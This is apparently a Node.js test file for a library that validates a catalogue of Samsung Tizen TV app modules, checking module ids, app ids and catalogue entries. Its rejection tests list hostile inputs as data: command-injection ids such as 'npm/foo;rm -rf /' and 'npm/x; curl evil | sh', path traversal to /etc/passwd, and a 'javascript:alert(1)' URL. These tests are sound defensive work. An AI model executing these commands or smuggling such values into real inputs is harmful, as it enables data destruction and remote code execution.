import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { createRequire } from 'node:module';
const require = createRequire(import.meta.url);
const Lib = require('../src/lib.js');
const cat = JSON.parse(readFileSync(new URL('../data/catalogue.json', import.meta.url), 'utf8'));

test('shipped catalogue is valid', () => {
  assert.deepEqual(Lib.validateCatalogue(cat), []);
});

test('catalogue includes the three modules already working on the TV', () => {
  const ids = cat.apps.filter((a) => a.kind === 'module').map((a) => a.moduleId);
  for (const id of ['npm/@foxreis/tizentube', 'npm/@jjg0/twizen', 'npm/@glenlowland/jellyfin-tizen']) assert.ok(ids.includes(id), id);
});

test('every entry is labelled and evidenced', () => {
  for (const a of cat.apps) {
    assert.ok(['module', 'standalone', 'unavailable'].includes(a.kind), a.id);
    assert.ok(a.source.licence && a.source.package && a.version && a.compatibility.note, a.id);
  }
});

test('valid module ids', () => {
  for (const id of ['npm/tizendebug', 'npm/@foxreis/tizentube', 'gh/tenda96/moonfin-tizenbrew', 'npm/@scope/pkg@1.2.3', 'gh/a/b@main']) {
    assert.ok(Lib.isValidModuleId(id), id);
  }
});

test('hostile or malformed module ids are rejected', () => {
  for (const id of ['', 'tizentube', 'npm/', 'npm/foo;rm -rf /', 'npm/$(id)', 'npm/`id`', 'gh/a/b/../c', 'gh/a/..', 'npm/foo bar',
    'http://evil/x', 'npm/@scope', 'gh/owner', 'npm/FOO|sh', 'npm/foo\nbar', 'npm/../../etc/passwd', 'file/foo', 'npm/foo/package.json', null, 42]) {
    assert.equal(Lib.isValidModuleId(id), false, String(id));
  }
});

test('app ids', () => {
  assert.ok(Lib.isValidAppId('MoonLightS.MoonlightWasm'));
  assert.ok(Lib.isValidAppId('org.apps2samsung.overscan'));
  for (const id of ['', 'nodot', 'a.b;c', '../x.y', 'a.b c']) assert.equal(Lib.isValidAppId(id), false, id);
});

test('baseModuleId / sameModule ignore version suffixes but not scope', () => {
  assert.equal(Lib.baseModuleId('npm/@foxreis/tizentube@1.2.3'), 'npm/@foxreis/tizentube');
  assert.equal(Lib.baseModuleId('npm/@foxreis/tizentube'), 'npm/@foxreis/tizentube');
  assert.equal(Lib.baseModuleId('gh/a/b@main'), 'gh/a/b');
  assert.ok(Lib.sameModule('npm/@jjg0/twizen', 'npm/@jjg0/twizen@0.3.3'));
  assert.ok(!Lib.sameModule('npm/@jjg0/twizen', 'npm/twizen'));
});

test('validator rejects unsafe catalogue changes', () => {
  const clone = () => JSON.parse(JSON.stringify(cat));
  const mut = (f) => { const c = clone(); f(c); return Lib.validateCatalogue(c); };
  assert.ok(mut((c) => { c.apps[0].moduleId = 'npm/x; curl evil | sh'; }).some((e) => e.includes('invalid moduleId')));
  assert.ok(mut((c) => { c.apps.push({ ...c.apps[0] }); }).some((e) => e.includes('duplicate')));
  assert.ok(mut((c) => { const s = c.apps.find((a) => a.kind === 'standalone'); s.addable = true; }).some((e) => e.includes('only modules')));
  assert.ok(mut((c) => { const s = c.apps.find((a) => a.kind === 'standalone'); delete s.install; }).some((e) => e.includes('install')));
  assert.ok(mut((c) => { const m = c.apps.find((a) => a.id === 'tizencast'); m.addable = true; }).some((e) => e.includes('addable')));
  assert.ok(mut((c) => { c.apps[0].source.repo = 'javascript:alert(1)'; }).some((e) => e.includes('https')));
  assert.ok(mut((c) => { c.apps[0].category = 'nope'; }).some((e) => e.includes('category')));
});
